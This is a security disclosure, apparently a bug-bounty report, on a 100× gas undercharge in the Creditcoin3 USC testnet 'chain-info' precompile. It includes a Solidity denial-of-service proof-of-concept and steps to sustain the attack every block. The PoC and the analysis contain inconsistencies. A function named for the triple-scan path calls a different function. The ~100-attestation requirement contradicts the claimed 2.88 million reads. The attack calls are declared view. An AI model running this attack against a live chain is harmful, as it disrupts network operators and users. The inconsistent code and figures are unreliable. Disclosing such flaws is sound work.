# [HIGH] ChainInfo Precompile: 100× Gas Undercharge Enables Cheap DoS on USC Testnet

## Summary

The `chain-info` precompile at address `0x0000000000000000000000000000000000000FD3` charges **26 gas per storage read** but performs work equivalent to **2,600 gas per read** — a 100× undercharge. Three functions contain this flaw and also perform **unbounded iteration** over all stored attestations. An attacker can exhaust the block gas limit (75,000,000) with a call that performs 2.88 million storage reads at 26 gas each, but forces nodes to execute 7.5 billion gas-equivalent work. This degrades or halts USC testnet operation at trivial cost.

---

## Severity

**HIGH**

---

## Affected Asset

- **Repository**: `gluwa/creditcoin3` (branch: `usc-dev`)
- **File**: `precompiles/chain-info/src/lib.rs`
- **Deployed address**: `0x0000000000000000000000000000000000000FD3` (USC testnet / CC3 testnet)

---

## Vulnerability Description

### Root Cause

The precompile defines two gas constants:

```rust
// precompiles/chain-info/src/lib.rs
const GAS_STORAGE_LOOKUP: u64 = 2600;   // correct cold-storage read cost
const GAS_PER_ITERATION_ITEM: u64 = 26; // actual charge per iterated item (100× too low)
```

Three functions iterate over `Attestations::iter_prefix(chain_key)` — a full scan of every stored attestation for the given chain — but charge only `GAS_PER_ITERATION_ITEM = 26` per item rather than `GAS_STORAGE_LOOKUP = 2600`.

### Affected Functions

**1. `find_highest_attested_before(chainKey, height)`**

When `height` is set to `type(uint64).max`, no checkpoint satisfies `height >= u64::MAX`, so the function falls through to the attestation-scan branch:

```rust
// Falls into attestation iteration when no checkpoint satisfies height >= target
for attestation in Attestations::iter_prefix(chain_key) {
    // each iteration: one storage read charged at 26 gas (should be 2600)
}
// charges: n_attestations * 26 gas
// actual cost: n_attestations * 2600 gas
```

**2. `find_lowest_attested_after(chainKey, height)`**

Falls to attestation scan when no checkpoint satisfies `checkpoint > target_height`. Same 26-gas-per-item undercharge.

**3. `is_height_attested(chainKey, height)` — None branch**

This function performs **three separate full attestation scans** in the None branch, tripling the undercharge:

```rust
// None branch: calls find_highest_attested_before + find_lowest_attested_after + direct scan
// 3 × n_attestations storage reads, each charged at 26 gas
```

### Why This Is a Vulnerability

A Substrate storage map iteration charges per-item reads against the gas meter. The correct cost for a cold storage read is 2,600 gas (matching `GAS_STORAGE_LOOKUP`). The precompile charges 26 gas — exactly 1/100th of the correct amount.

With the block gas limit set to 75,000,000:
- **Gas budget available**: 75,000,000 / 26 ≈ 2,884,615 attestation reads per block
- **Actual computation**: 2,884,615 × 2,600 = 7,500,000,000 gas-equivalent work
- **Ratio**: an attacker gets 100× more computation than paid for

The more attestations accumulate on the chain over time, the more severe the per-call DoS becomes. With `is_height_attested`, the multiplier is 3×.

---

## Impact

- **Denial of Service** of the USC testnet: an attacker can pack 75 million gas worth of precompile calls (at the discounted rate) into a single block, but force each block-producing node to execute 7.5 billion gas-equivalent of storage reads.
- **Chain degradation or stall**: nodes may be unable to produce blocks within the expected slot time due to excessive I/O.
- **Attack is self-sustaining and cheap**: at 100× undercharge, sustaining the attack costs 1/100th what it should, making economically rational mitigation (raising gas price) ineffective.
- The attack worsens monotonically — every attestation added to the chain increases the amplification factor.

---

## Proof of Concept

Deploy the following contract on the USC testnet (CC3 testnet). Call `attack()` to trigger the DoS in a single transaction.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IChainInfo {
    // find_highest_attested_before(chainKey, height) → (bool found, uint64 blockNumber)
    function find_highest_attested_before(uint64 chainKey, uint64 height)
        external view returns (bool, uint64);
}

contract ChainInfoDoS {
    IChainInfo constant CHAIN_INFO =
        IChainInfo(0x0000000000000000000000000000000000000FD3);

    // chainKey for the target source chain (e.g., Ethereum = 1)
    uint64 constant TARGET_CHAIN = 1;

    /// @notice Trigger the DoS — passes type(uint64).max as the height so
    ///         the precompile falls into the full attestation-scan branch.
    ///         Each attestation costs 26 gas on the meter but 2600 in real work.
    function attack() external view returns (bool, uint64) {
        return CHAIN_INFO.find_highest_attested_before(TARGET_CHAIN, type(uint64).max);
    }

    /// @notice Even worse: is_height_attested with no matching attestation
    ///         triggers THREE full scans in the None branch.
    function attack_triple(uint64 nonExistentHeight) external view {
        // Intentionally not using the return value — just exhausting gas
        CHAIN_INFO.find_highest_attested_before(TARGET_CHAIN, nonExistentHeight);
    }
}
```

**Steps to reproduce:**
1. Deploy `ChainInfoDoS` on USC testnet.
2. Ensure the USC testnet has at least ~100 accumulated attestations for the target chain (normal operation produces these).
3. Call `attack()` — observe that the transaction consumes the full block gas budget (75M gas at 26 gas/item) while forcing the node to do 7.5B gas-equivalent of storage reads.
4. Monitor block production time — blocks including this call will be significantly delayed or timed out.
5. Repeat each block to sustain the attack.

**Expected gas usage**: ~75,000,000 gas (full block limit) at the undercharged 26 gas/item rate.  
**Actual node work**: ~7,500,000,000 gas-equivalent (100× amplification).

---

## References

- `precompiles/chain-info/src/lib.rs` — constants `GAS_STORAGE_LOOKUP` and `GAS_PER_ITERATION_ITEM`
- Substrate EVM gas accounting: cold storage read = 2,600 gas (EIP-2929 equivalent)
- Block gas limit: 75,000,000 (confirmed in `runtime/src/lib.rs`)
